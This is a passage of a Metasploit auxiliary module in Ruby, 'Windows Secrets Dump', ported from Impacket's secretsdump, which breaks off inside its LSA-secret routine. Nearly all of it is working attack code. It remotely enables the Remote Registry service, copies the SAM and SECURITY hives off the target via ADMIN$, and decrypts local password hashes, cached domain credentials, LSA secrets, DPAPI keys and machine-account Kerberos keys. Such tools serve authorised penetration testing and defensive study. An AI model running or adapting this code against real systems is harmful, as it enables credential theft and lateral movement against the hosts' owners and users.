##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC
  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Secrets Dump',
        'Description' => %q{
          Dumps SAM hashes and LSA secrets (including cached creds) from the
          remote Windows target without executing any agent locally. First, it
          reads as much data as possible from the registry and then save the
          hives locally on the target (%SYSTEMROOT%\random.tmp). Finally, it
          downloads the temporary hive files and reads the rest of the data
          from it. This temporary files are removed when it's done.

          This modules takes care of starting or enabling the Remote Registry
          service if needed. It will restore the service to its original state
          when it's done.

          This is a port of the great Impacket `secretsdump.py` code written by
          Alberto Solino. Note that the `NTDS.dit` technique has not been
          implement yet. It will be done in a next iteration.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Alberto Solino', # Original Impacket code
          'Christophe De La Fuente', # MSf module
        ],
        'References' => [
          ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py'],
        ],
        'Notes' => {
          'Reliability' => [],
          'Stability' => [],
          'SideEffects' => [ IOC_IN_LOGS ]
        }
      )
    )

    register_options([ Opt::RPORT(445) ])

    @service_should_be_stopped = false
    @service_should_be_disabled = false
    @lsa_vista_style = true
  end

  class CacheData < BinData::Record
    mandatory_parameter :user_name_length
    mandatory_parameter :domain_name_length
    mandatory_parameter :dns_domain_name_length
    mandatory_parameter :upn_length
    mandatory_parameter :effective_name_length
    mandatory_parameter :full_name_length
    mandatory_parameter :logon_script_length
    mandatory_parameter :profile_path_length
    mandatory_parameter :home_directory_length
    mandatory_parameter :home_directory_drive_length
    mandatory_parameter :group_count
    mandatory_parameter :logon_domain_name_length

    endian :little

    string   :enc_hash, length: 16
    string   :unknown, length: 56
    string16 :username, length: -> { user_name_length }
    string   :pad1, length: -> { pad_length(username) }
    string16 :domain_name, length: -> { domain_name_length }
    string   :pad2, length: -> { pad_length(domain_name) }
    string16 :dns_domain_name, length: -> { dns_domain_name_length }
    string   :pad3, length: -> { pad_length(dns_domain_name) }
    string16 :upn, length: -> { upn_length }
    string   :pad4, length: -> { pad_length(upn) }
    string16 :effective_name, length: -> { effective_name_length }
    string   :pad5, length: -> { pad_length(effective_name) }
    string16 :full_name, length: -> { full_name_length }
    string   :pad6, length: -> { pad_length(full_name) }
    string16 :logon_script, length: -> { logon_script_length }
    string   :pad7, length: -> { pad_length(logon_script) }
    string16 :profile_path, length: -> { profile_path_length }
    string   :pad8, length: -> { pad_length(profile_path) }
    string16 :home_directory, length: -> { home_directory_length }
    string   :pad9, length: -> { pad_length(home_directory) }
    string16 :home_directory_drive, length: -> { home_directory_drive_length }
    string   :pad10, length: -> { pad_length(home_directory_drive) }
    array    :groups, initial_length: -> { group_count } do
      uint32 :relative_id
      uint32 :attributes
    end
    string16 :logon_domain_name, length: -> { logon_domain_name_length }

    # Determines the correct length for the padding, so that the next
    # field is 4-byte aligned.
    def pad_length(prev_element)
      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
      (4 - offset) % 4
    end
  end

  class CacheEntry < BinData::Record
    endian :little

    uint16    :user_name_length
    uint16    :domain_name_length
    uint16    :effective_name_length
    uint16    :full_name_length
    uint16    :logon_script_length
    uint16    :profile_path_length
    uint16    :home_directory_length
    uint16    :home_directory_drive_length
    uint32    :user_id
    uint32    :primary_group_id
    uint32    :group_count
    uint16    :logon_domain_name_length
    uint16    :logon_domain_id_length
    file_time :last_access
    uint32    :revision
    uint32    :sid_count
    uint16    :valid
    uint16    :iteration_count
    uint32    :sif_length
    uint32    :logon_package
    uint16    :dns_domain_name_length
    uint16    :upn_length
    string    :iv, length: 16
    string    :ch, length: 16
    array     :enc_data, type: :uint8, read_until: :eof
  end

  def enable_registry
    svc_handle = @svcctl.open_service_w(@scm_handle, 'RemoteRegistry')
    svc_status = @svcctl.query_service_status(svc_handle)
    case svc_status.dw_current_state
    when RubySMB::Dcerpc::Svcctl::SERVICE_RUNNING
      print_status('Service RemoteRegistry is already running')
    when RubySMB::Dcerpc::Svcctl::SERVICE_STOPPED
      print_status('Service RemoteRegistry is in stopped state')
      svc_config = @svcctl.query_service_config(svc_handle)
      if svc_config.dw_start_type == RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED
        print_status('Service RemoteRegistry is disabled, enabling it...')
        @svcctl.change_service_config_w(
          svc_handle,
          start_type: RubySMB::Dcerpc::Svcctl::SERVICE_DEMAND_START
        )
        @service_should_be_disabled = true
      end
      print_status('Starting service...')
      @svcctl.start_service_w(svc_handle)
      @service_should_be_stopped = true
    else
      print_error('Unable to get the service RemoteRegistry state')
    end
  ensure
    @svcctl.close_service_handle(svc_handle) if svc_handle
  end

  def get_boot_key
    print_status('Retrieving target system bootKey')
    root_key_handle = @winreg.open_root_key('HKLM')

    boot_key = ''.b
    ['JD', 'Skew1', 'GBG', 'Data'].each do |key|
      sub_key = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\#{key}"
      vprint_status("Retrieving class info for #{sub_key}")
      subkey_handle = @winreg.open_key(root_key_handle, sub_key)
      query_info_key_response = @winreg.query_info_key(subkey_handle)
      boot_key << query_info_key_response.lp_class.to_s.encode(::Encoding::ASCII_8BIT)
      @winreg.close_key(subkey_handle)
      subkey_handle = nil
    rescue RubySMB::Dcerpc::Error::WinregError => e
      vprint_error("An error occured when retrieving class for #{sub_key}: #{e}")
      raise e
    ensure
      @winreg.close_key(subkey_handle) if subkey_handle
    end
    if boot_key.size != 32
      vprint_error("bootKey must be 16-bytes long (hex string of 32 chars), got \"#{boot_key}\" (#{boot_key.size} chars)")
      return ''.b
    end

    transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]
    boot_key = [boot_key].pack('H*')
    boot_key = transforms.map { |i| boot_key[i] }.join
    print_good("bootKey: 0x#{boot_key.unpack('H*')[0]}") unless boot_key&.empty?
    boot_key
  ensure
    @winreg.close_key(root_key_handle) if root_key_handle
  end

  def lm_hash_not_stored?
    vprint_status('Checking NoLMHash policy')
    res = @winreg.read_registry_key_value('HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa', 'NoLmHash', bind: false)
    if res == 1
      vprint_status('LMHashes are not being stored')
      return true
    else
      vprint_status('LMHashes are being stored')
      return false
    end
  rescue RubySMB::Dcerpc::Error::WinregError => e
    vprint_warning("An error occured when checking NoLMHash policy: #{e}")
  end

  def save_registry_key(hive_name)
    vprint_status("Create #{hive_name} key")
    root_key_handle = @winreg.open_root_key('HKLM')
    new_key_handle = @winreg.create_key(root_key_handle, hive_name)

    file_name = "#{Rex::Text.rand_text_alphanumeric(8)}.tmp"
    vprint_status("Save key to #{file_name}")
    @winreg.save_key(new_key_handle, file_name)
    file_name
  rescue RubySMB::Dcerpc::Error::WinregError => e
    vprint_error("An error occured when saving #{hive_name} key: #{e}")
    raise e
  ensure
    @winreg.close_key(new_key_handle) if new_key_handle
    @winreg.close_key(root_key_handle) if root_key_handle
  end

  def retrieve_hive(hive_name)
    file_name = save_registry_key(hive_name)
    tree2 = simple.client.tree_connect("\\\\#{sock.peerhost}\\ADMIN$")
    file = tree2.open_file(filename: "System32\\#{file_name}", delete: true, read: true)
    file.read
  rescue RubySMB::Dcerpc::Error::WinregError => e
    vprint_error("An error occured when retrieving #{hive_name} hive file: #{e}")
    raise e
  ensure
    file.delete if file
    file.close if file
    tree2.disconnect! if tree2
  end

  def save_sam
    print_status('Saving remote SAM database')
    retrieve_hive('SAM')
  end

  def save_security
    print_status('Saving remote SECURITY database')
    retrieve_hive('SECURITY')
  end

  def get_hboot_key(reg_parser, boot_key)
    vprint_status('Calculating HashedBootKey from SAM')
    qwerty = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
    digits = "0123456789012345678901234567890123456789\0"

    _value_type, value_data = reg_parser.get_value('SAM\\Domains\\Account', 'F')
    revision = value_data[0x68, 4].unpack('V')[0]
    case revision
    when 1
      hash = Digest::MD5.new
      hash.update(value_data[0x70, 16] + qwerty + boot_key + digits)
      rc4 = OpenSSL::Cipher.new('rc4')
      rc4.decrypt
      rc4.key = hash.digest
      hboot_key = rc4.update(value_data[0x80, 32])
      hboot_key << rc4.final
      hboot_key
    when 2
      aes = OpenSSL::Cipher.new('aes-128-cbc')
      aes.decrypt
      aes.key = boot_key
      aes.padding = 0
      aes.iv = value_data[0x78, 16]
      aes.update(value_data[0x88, 16]) # we need only 16 bytes
    else
      print_warning("Unknown hbootKey revision: #{revision}")
      ''.b
    end
  end

  def enum_key(reg_parser, key)
    parent_key = reg_parser.find_key(key)
    return nil unless parent_key

    return reg_parser.enum_key(parent_key)
  end

  def enum_values(reg_parser, key)
    key_obj = reg_parser.find_key(key)
    return nil unless key_obj

    return reg_parser.enum_values(key_obj)
  end

  def get_user_keys(reg_parser)
    users = {}
    users_key = 'SAM\\Domains\\Account\\Users'
    rids = enum_key(reg_parser, users_key)
    if rids
      rids.delete('Names')

      rids.each do |rid|
        _value_type, value_data = reg_parser.get_value("#{users_key}\\#{rid}", 'V')
        users[rid.to_i(16)] ||= {}
        users[rid.to_i(16)][:V] = value_data

        # Attempt to get Hints
        _value_type, value_data = reg_parser.get_value("#{users_key}\\#{rid}", 'UserPasswordHint')
        next unless value_data

        users[rid.to_i(16)][:UserPasswordHint] =
          value_data.dup.force_encoding(::Encoding::UTF_16LE).encode(::Encoding::UTF_8).strip
      end
    end

    # Retrieve the user names for each RID
    # TODO: use a proper structure to do this, since the user names are included in V data
    names = enum_key(reg_parser, "#{users_key}\\Names")
    if names
      names.each do |name|
        value_type, _value_data = reg_parser.get_value("#{users_key}\\Names\\#{name}", '')
        users[value_type] ||= {}
        # Apparently, key names are ISO-8859-1 encoded
        users[value_type][:Name] = name.dup.force_encoding(::Encoding::ISO_8859_1).encode(::Encoding::UTF_8)
      end
    end

    users
  end

  # TODO: use a proper structure for V data, instead of unpacking directly
  def decrypt_user_keys(hboot_key, users)
    sam_lmpass = "LMPASSWORD\x00"
    sam_ntpass = "NTPASSWORD\x00"
    sam_empty_lm = ['aad3b435b51404eeaad3b435b51404ee'].pack('H*')
    sam_empty_nt = ['31d6cfe0d16ae931b73c59d7e0c089c0'].pack('H*')

    users.each do |rid, user|
      next unless user[:V]

      hashlm_off = user[:V][0x9c, 4]&.unpack('V')&.first
      hashlm_len = user[:V][0xa0, 4]&.unpack('V')&.first
      if hashlm_off && hashlm_len
        hashlm_enc = user[:V][hashlm_off + 0xcc, hashlm_len]
        user[:hashlm] = decrypt_user_hash(rid, hboot_key, hashlm_enc, sam_lmpass, sam_empty_lm)
      else
        print_error('Unable to extract LM hash')
        user[:hashlm] = sam_empty_lm
      end

      hashnt_off = user[:V][0xa8, 4]&.unpack('V')&.first
      hashnt_len = user[:V][0xac, 4]&.unpack('V')&.first
      if hashnt_off && hashnt_len
        hashnt_enc = user[:V][hashnt_off + 0xcc, hashnt_len]
        user[:hashnt] = decrypt_user_hash(rid, hboot_key, hashnt_enc, sam_ntpass, sam_empty_nt)
      else
        print_error('Unable to extract NT hash')
        user[:hashlm] = sam_empty_nt
      end
    end

    users
  end

  def rid_to_key(rid)
    s1 = [rid].pack('V')
    s1 << s1[0, 3]

    s2b = [rid].pack('V').unpack('C4')
    s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack('C4')
    s2 << s2[0, 3]

    [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
  end

  def decrypt_user_hash(rid, hboot_key, enc_hash, pass, default)
    revision = enc_hash[2, 2]&.unpack('v')&.first

    case revision
    when 1
      if enc_hash.length < 20
        return default
      end

      md5 = Digest::MD5.new
      md5.update(hboot_key[0, 16] + [rid].pack('V') + pass)

      rc4 = OpenSSL::Cipher.new('rc4')
      rc4.decrypt
      rc4.key = md5.digest
      okey = rc4.update(enc_hash[4, 16])
    when 2
      if enc_hash.length < 40
        return default
      end

      aes = OpenSSL::Cipher.new('aes-128-cbc')
      aes.decrypt
      aes.key = hboot_key[0, 16]
      aes.padding = 0
      aes.iv = enc_hash[8, 16]
      okey = aes.update(enc_hash[24, 16]) # we need only 16 bytes
    else
      print_error("Unknown user hash revision: #{revision}")
      return default
    end

    des_k1, des_k2 = rid_to_key(rid)

    d1 = OpenSSL::Cipher.new('des-ecb')
    d1.decrypt
    d1.padding = 0
    d1.key = des_k1

    d2 = OpenSSL::Cipher.new('des-ecb')
    d2.decrypt
    d2.padding = 0
    d2.key = des_k2

    d1o = d1.update(okey[0, 8])
    d1o << d1.final

    d2o = d2.update(okey[8, 8])
    d1o << d2.final
    d1o + d2o
  end

  def service_data
    {
      address: rhost,
      port: rport,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
  end

  def report_creds(user, hash, type: :ntlm_hash, jtr_format: '', realm_key: nil, realm_value: nil)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: hash,
      private_type: type,
      jtr_format: jtr_format,
      username: user
    }.merge(service_data)
    credential_data[:realm_key] = realm_key if realm_key
    credential_data[:realm_value] = realm_value if realm_value

    cl = create_credential_and_login(credential_data)
    cl.respond_to?(:core_id) ? cl.core_id : nil
  end

  def report_info(data, type = '')
    report_note(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: 'smb',
      type: type,
      data: data,
      update: :unique_data
    )
  end

  def dump_sam_hashes(reg_parser, boot_key)
    print_status('Dumping SAM hashes')
    hboot_key = get_hboot_key(reg_parser, boot_key)
    unless hboot_key.present?
      print_warning('Unable to get hbootKey')
      return
    end
    users = get_user_keys(reg_parser)
    decrypt_user_keys(hboot_key, users)

    print_status('Password hints:')
    hint_count = 0
    users.keys.sort { |a, b| a <=> b }.each do |rid|
      # If we have a hint then print it
      next unless !users[rid][:UserPasswordHint].nil? && !users[rid][:UserPasswordHint].empty?

      hint = "#{users[rid][:Name]}: \"#{users[rid][:UserPasswordHint]}\""
      report_info(hint, 'user.password_hint')
      print_line(hint)
      hint_count += 1
    end
    print_line('No users with password hints on this system') if hint_count == 0

    print_status('Password hashes (pwdump format - uid:rid:lmhash:nthash:::):')
    users.keys.sort { |a, b| a <=> b }.each do |rid|
      hash = "#{users[rid][:hashlm].unpack('H*')[0]}:#{users[rid][:hashnt].unpack('H*')[0]}"
      unless report_creds(users[rid][:Name], hash)
        vprint_bad("Error when reporting #{users[rid][:Name]} hash")
      end
      print_line("#{users[rid][:Name]}:#{rid}:#{hash}:::")
    end
  end

  def get_lsa_secret_key(reg_parser, boot_key)
    print_status('Decrypting LSA Key')
    vprint_status('Getting PolEKList...')
    _value_type, value_data = reg_parser.get_value('\\Policy\\PolEKList')
    if value_data
      vprint_status('Vista or above system')

      lsa_key = decrypt_lsa_data(value_data, boot_key)
      lsa_key = lsa_key[68, 32] unless lsa_key.empty?
    else
      vprint_status('Getting PolSecretEncryptionKey...')
      _value_type, value_data = reg_parser.get_value('\\Policy\\PolSecretEncryptionKey')
      # If that didn't work, then we're out of luck
      return nil if value_data.nil?

      vprint_status('XP or below system')
      @lsa_vista_style = false

      md5x = Digest::MD5.new
      md5x << boot_key
      1000.times do
        md5x << value_data[60, 16]
      end

      rc4 = OpenSSL::Cipher.new('rc4')
      rc4.decrypt
      rc4.key = md5x.digest
      lsa_key = rc4.update(value_data[12, 48])
      lsa_key << rc4.final
      lsa_key = lsa_key[0x10..0x1F]
    end

    vprint_good("LSA key: #{lsa_key.unpack('H*')[0]}")
    return lsa_key
  end

  def get_nlkm_secret_key(reg_parser, lsa_key)
    print_status('Decrypting NL$KM')
    _value_type, value_data = reg_parser.get_value('\\Policy\\Secrets\\NL$KM\\CurrVal')
    return nil unless value_data

    if lsa_vista_style?
      nlkm_dec = decrypt_lsa_data(value_data, lsa_key)
    else
      value_data_size = value_data[0, 4].unpack('<L').first
      nlkm_dec = decrypt_secret_data(value_data[(value_data.size - value_data_size)..-1], lsa_key)
    end

    return nlkm_dec
  end

  def decrypt_hash_vista(edata, nlkm, iv)
    aes = OpenSSL::Cipher.new('aes-128-cbc')
    aes.decrypt
    aes.key = nlkm[16...32]
    aes.padding = 0
    aes.iv = iv

    decrypted = ''
    (0...edata.length).step(16) do |i|
      decrypted << aes.update(edata[i, 16])
    end

    return decrypted
  end

  def decrypt_hash(edata, nlkm, iv)
    rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), nlkm, iv)
    rc4 = OpenSSL::Cipher.new('rc4')
    rc4.decrypt
    rc4.key = rc4key
    decrypted = rc4.update(edata)
    decrypted << rc4.final

    return decrypted
  end

  def dump_cached_hashes(reg_parser, nlkm_key)
    print_status('Dumping cached hashes')
    values = enum_values(reg_parser, '\\Cache')
    unless values
      print_status('No cashed entries')
      return
    end

    values.delete('NL$Control')
    iteration_count = nil
    if values.delete('NL$IterationCount')
      _value_type, value_data = reg_parser.get_value('\\Cache', 'NL$IterationCount')
      if value_data.to_i > 10240
        iteration_count = value_data.to_i & 0xfffffc00
      else
        iteration_count = value_data.to_i * 1024
      end
    end

    hashes = ''
    values.each do |value|
      vprint_status("Looking into #{value}")
      _value_type, value_data = reg_parser.get_value('\\Cache', value)
      nl = value_data

      cache = CacheEntry.read(nl)

      next unless (cache.user_name_length > 0)

      vprint_status("Reg entry: #{nl.unpack('H*')[0]}")
      vprint_status("Encrypted data: #{cache.enc_data.to_hex}")
      vprint_status("IV:  #{cache.iv.to_hex}")

      enc_data = cache.enc_data.map(&:chr).join
      if lsa_vista_style?
        dec_data = decrypt_hash_vista(enc_data, nlkm_key, cache.iv)
      else
        dec_data = decrypt_hash(enc_data, nlkm_key, cache.iv)
      end

      vprint_status("Decrypted data: #{dec_data.unpack('H*')[0]}")

      params = cache.snapshot.to_h.select { |key, _v| key.to_s.end_with?('_length') }
      params[:group_count] = cache.group_count
      cache_data = CacheData.new(params).read(dec_data)
      username = cache_data.username.encode(::Encoding::UTF_8)
      if iteration_count.nil? && lsa_vista_style?
        if (cache.iteration_count > 10240)
          iteration_count = cache.iteration_count & 0xfffffc00
        else
          iteration_count = cache.iteration_count * 1024
        end
      end
      info = []
      info << ("Username: #{username}")
      if iteration_count
        info << ("Iteration count: #{cache.iteration_count} -> real #{iteration_count}")
      end
      info << ("Last login: #{cache.last_access.to_time}")
      dns_domain_name = cache_data.dns_domain_name.encode(::Encoding::UTF_8)
      info << ("DNS Domain Name: #{dns_domain_name}")
      info << ("UPN: #{cache_data.upn.encode(::Encoding::UTF_8)}")
      info << ("Effective Name: #{cache_data.effective_name.encode(::Encoding::UTF_8)}")
      info << ("Full Name: #{cache_data.full_name.encode(::Encoding::UTF_8)}")
      info << ("Logon Script: #{cache_data.logon_script.encode(::Encoding::UTF_8)}")
      info << ("Profile Path: #{cache_data.profile_path.encode(::Encoding::UTF_8)}")
      info << ("Home Directory: #{cache_data.home_directory.encode(::Encoding::UTF_8)}")
      info << ("Home Directory Drive: #{cache_data.home_directory_drive.encode(::Encoding::UTF_8)}")
      info << ("User ID: #{cache.user_id}")
      info << ("Primary Group ID: #{cache.primary_group_id}")
      info << ("Additional groups: #{cache_data.groups.map(&:relative_id).join(' ')}")
      logon_domain_name = cache_data.logon_domain_name.encode(::Encoding::UTF_8)
      info << ("Logon domain name: #{logon_domain_name}")

      report_info(info.join('; '), 'user.cache_info')
      vprint_line(info.join("\n"))

      credential_opts = {
        type: :nonreplayable_hash,
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: logon_domain_name
      }
      if lsa_vista_style?
        jtr_hash = "$DCC2$#{iteration_count}##{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
      else
        jtr_hash = "M$#{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
      end
      credential_opts[:jtr_format] = identify_hash(jtr_hash)
      unless report_creds("#{logon_domain_name}\\#{username}", jtr_hash, **credential_opts)
        vprint_bad("Error when reporting #{logon_domain_name}\\#{username} hash (#{credential_opts[:jtr_format]} format)")
      end
      hashes << "#{logon_domain_name}\\#{username}:#{jtr_hash}\n"
    end

    if hashes.empty?
      print_line('No cached hashes on this system')
    else
      print_status("Hash#{'es' if hashes.lines.size > 1} are in '#{lsa_vista_style? ? 'mscash2' : 'mscash'}' format")
      print_line(hashes)
    end
  end

  def get_service_account(service_name)
    return nil unless @svcctl

    vprint_status("Getting #{service_name} service account")
    svc_handle = @svcctl.open_service_w(@scm_handle, service_name)
    svc_config = @svcctl.query_service_config(svc_handle)
    return nil if svc_config.lp_service_start_name == :null

    svc_config.lp_service_start_name.to_s
  rescue RubySMB::Dcerpc::Error::SvcctlError => e
    vprint_warning("An error occured when getting #{service_name} service account: #{e}")
    return nil
  ensure
    @svcctl.close_service_handle(svc_handle) if svc_handle
  end

  def get_default_login_account
    vprint_status('Getting default login account')
    begin
      username = @winreg.read_registry_key_value(
        'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
        'DefaultUserName',
        bind: false
      )
    rescue RubySMB::Dcerpc::Error::WinregError => e
      vprint_warning("An error occured when getting the default user name: #{e}")
      return nil
    end
    return nil if username.nil? || username.empty?

    username = username.encode(::Encoding::UTF_8)

    begin
      domain = @winreg.read_registry_key_value(
        'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
        'DefaultDomainName',
        bind: false
      )
    rescue RubySMB::Dcerpc::Error::WinregError => e
      vprint_warning("An error occured when getting the default domain name: #{e}")
      domain = ''
    end
    username = "#{domain.encode(::Encoding::UTF_8)}\\#{username}" unless domain.nil? || domain.empty?
    username
  end

  # Returns Kerberos salt for the current connection if we have the correct information
  def get_machine_kerberos_salt
    host = simple.client.default_name
    return ''.b if host.nil? || host.empty?

    domain = simple.client.dns_domain_name
    "#{domain.upcase}host#{host.downcase}.#{domain.downcase}".b
  end

  def add_parity(byte_str)
    byte_str.map do |byte|
      if byte.to_s(2).count('1').odd?
        (byte << 1) & 0b11111110
      else
        (byte << 1) | 0b00000001
      end
    end
  end

  def fix_parity(byte_str)
    byte_str.map do |byte|
      t = byte.to_s(2).rjust(8, '0')
      if t[0, 7].count('1').odd?
        ("#{t[0, 7]}0").to_i(2).chr
      else
        ("#{t[0, 7]}1").to_i(2).chr
      end
    end
  end

  def weak_des_key?(key)
    [
      "\x01\x01\x01\x01\x01\x01\x01\x01",
      "\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE",
      "\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E",
      "\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1",
      "\x01\xFE\x01\xFE\x01\xFE\x01\xFE",
      "\xFE\x01\xFE\x01\xFE\x01\xFE\x01",
      "\x1F\xE0\x1F\xE0\x0E\xF1\x0E\xF1",
      "\xE0\x1F\xE0\x1F\xF1\x0E\xF1\x0E",
      "\x01\xE0\x01\xE0\x01\xF1\x01\xF1",
      "\xE0\x01\xE0\x01\xF1\x01\xF1\x01",
      "\x1F\xFE\x1F\xFE\x0E\xFE\x0E\xFE",
      "\xFE\x1F\xFE\x1F\xFE\x0E\xFE\x0E",
      "\x01\x1F\x01\x1F\x01\x0E\x01\x0E",
      "\x1F\x01\x1F\x01\x0E\x01\x0E\x01",
      "\xE0\xFE\xE0\xFE\xF1\xFE\xF1\xFE",
      "\xFE\xE0\xFE\xE0\xFE\xF1\xFE\xF1"
    ].include?(key)
  end

  def aes_cts_hmac_sha1_96_key(algorithm, raw_secret, salt)
    iterations = 4096
    cipher = OpenSSL::Cipher::AES.new(algorithm)
    key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(raw_secret, salt, iterations, cipher.key_len)
    plaintext = "kerberos\x7B\x9B\x5B\x2B\x93\x13\x2B\x93".b
    rnd_seed = ''.b
    loop do
      cipher.reset
      cipher.encrypt
      cipher.iv = "\x00".b * 16
      cipher.key = key
      ciphertext = cipher.update(plaintext)
      rnd_seed += ciphertext
      break unless rnd_seed.size < cipher.key_len

      plaintext = ciphertext
    end
    rnd_seed.unpack('H*')[0]
  end

  def des_cbc_md5(raw_secret, salt)
    odd = true
    tmp_byte_str = [0, 0, 0, 0, 0, 0, 0, 0]
    plaintext = raw_secret + salt
    plaintext += "\x00".b * (8 - (plaintext.size % 8))
    plaintext.bytes.each_slice(8) do |block|
      tmp_56 = block.map { |byte| byte & 0b01111111 }
      if !odd
        # rubocop:disable Style/FormatString
        tmp_56_str = tmp_56.map { |byte| '%07b' % byte }.join
        # rubocop:enable Style/FormatString
        tmp_56_str.reverse!
        tmp_56 = tmp_56_str.bytes.each_slice(7).map do |bits7|
          bits7.map(&:chr).join.to_i(2)
        end
      end
      odd = !odd
      tmp_byte_str = tmp_byte_str.zip(tmp_56).map { |a, b| a ^ b }
    end
    tempkey = add_parity(tmp_byte_str).map(&:chr).join
    if weak_des_key?(tempkey)
      tempkey[7] = (tempkey[7].ord ^ 0xF0).chr
    end
    cipher = OpenSSL::Cipher.new('DES-CBC')
    cipher.encrypt
    cipher.iv = tempkey
    cipher.key = tempkey
    chekcsumkey = cipher.update(plaintext)[-8..-1]
    chekcsumkey = fix_parity(chekcsumkey.bytes).map(&:chr).join
    if weak_des_key?(chekcsumkey)
      chekcsumkey[7] = (chekcsumkey[7].ord ^ 0xF0).chr
    end
    chekcsumkey.unpack('H*')[0]
  end

  def get_machine_kerberos_keys(raw_secret, _machine_name)
    vprint_status('Calculating machine account Kerberos keys')
    # Attempt to create Kerberos keys from machine account (if possible)
    secret = []
    salt = get_machine_kerberos_salt
    if salt.empty?
      vprint_error('Unable to get the salt')
      return ''
    end

    raw_secret = raw_secret.dup.force_encoding(::Encoding::UTF_16LE).encode(::Encoding::UTF_8, invalid: :replace).b

    secret << "aes256-cts-hmac-sha1-96:#{aes_cts_hmac_sha1_96_key('256-CBC', raw_secret, salt)}"
    secret << "aes128-cts-hmac-sha1-96:#{aes_cts_hmac_sha1_96_key('128-CBC', raw_secret, salt)}"
    secret << "des-cbc-md5:#{des_cbc_md5(raw_secret, salt)}"

    secret
  end

  def print_secret(name, secret_item)
    if secret_item.nil? || secret_item.empty?
      vprint_status("Discarding secret #{name}, NULL Data")
      return
    end

    if secret_item.start_with?("\x00\x00".b)
      vprint_status("Discarding secret #{name}, all zeros")
      return
    end

    upper_name = name.upcase
    print_line(name.to_s)

    secret = ''
    if upper_name.start_with?('_SC_')
      # Service name, a password might be there
      # We have to get the account the service runs under
      account = get_service_account(name[4..-1])
      if account
        secret = "#{account.encode(::Encoding::UTF_8)}:"
      else
        secret = '(Unknown User): '
      end
      secret << secret_item
    elsif upper_name.start_with?('DEFAULTPASSWORD')
      # We have to get the account this password is for
      account = get_default_login_account || '(Unknown User)'
      password = secret_item.dup.force_encoding(::Encoding::UTF_16LE).encode(::Encoding::UTF_8)
      unless report_creds(account, password, type: :password)
        vprint_bad("Error when reporting #{account} default password")
      end
      secret << "#{account}: #{password}"
    elsif upper_name.start_with?('ASPNET_WP_PASSWORD')
      secret = "ASPNET: #{secret_item}"
    elsif upper_name.start_with?('DPAPI_SYSTEM')
      # Decode the DPAPI Secrets
      machine_key = secret_item[4, 20]
      user_key = secret_item[24, 20]
      report_info(machine_key.unpack('H*')[0], 'dpapi.machine_key')
      report_info(user_key.unpack('H*')[0], 'dpapi.user_key')
      secret = "dpapi_machinekey: 0x#{machine_key.unpack('H*')[0]}\ndpapi_userkey: 0x#{user_key.unpack('H*')[0]}"
    elsif upper_name.start_with?('$MACHINE.ACC')
      md4 = OpenSSL::Digest::MD4.digest(secret_item)
      machine = simple.client.default_name
      domain = simple.client.default_domain
      print_name = "#{domain}\\#{machine}$"
      ntlm_hash = "#{Net::NTLM.lm_hash('').unpack('H*')[0]}:#{md4.unpack('H*')[0]}"
      secret_ary = ["#{print_name}:#{ntlm_hash}:::"]
      credential_opts = {
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: domain
      }
      unless report_creds(print_name, ntlm_hash, **credential_opts)
        vprint_bad("Error when reporting #{print_name} NTLM hash")
      end

      raw_passwd = secret_item.unpack('H*')[0]
      credential_opts[:type] = :password
      unless report_creds(print_name, raw_passwd, **credential_opts)
        vprint_bad("Error when reporting #{print_name} raw password hash")
      end
      secret = "#{print_name}:plain_password_hex:#{raw_passwd}\n"

      extra_secret = get_machine_kerberos_keys(secret_item, print_name)
      if extra_secret.empty?
        vprint_status('Could not calculate machine account Kerberos keys')
      else
        credential_opts[:type] = :nonreplayable_hash
        extra_secret.each do |sec|
          unless report_creds(print_name, sec, **credential_opts)
            vprint_bad("Error when reporting #{print_name} machine kerberos key #{sec}")
          end
          sec.prepend("#{print_name}:")
        end
      end

      secret << extra_secret.concat(secret_ary).join("\n")
    end

    if secret.empty?
      print_line(Rex::Text.to_hex_dump(secret_item).strip)
      print_line("Hex string: #{secret_item.unpack('H*')[0]}")
    else
      print_line(secret)
    end
    print_line
  end

  def dump_lsa_secrets(reg_parser, lsa_key)
    print_status('Dumping LSA Secrets')

    keys = enum_key(reg_parser, '\\Policy\\Secrets')
    return unless keys

    keys.delete('NL$Control')

    keys.each do |key|
      vprint_status("Looking into #{key}")
      _value_type, value_data = reg_parser.get_value("\\Policy\\Secrets\\#{key}\\CurrVal")
      encrypted_secret = value_data
      next unless encrypted_secret

      if lsa_vista_style?
        decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
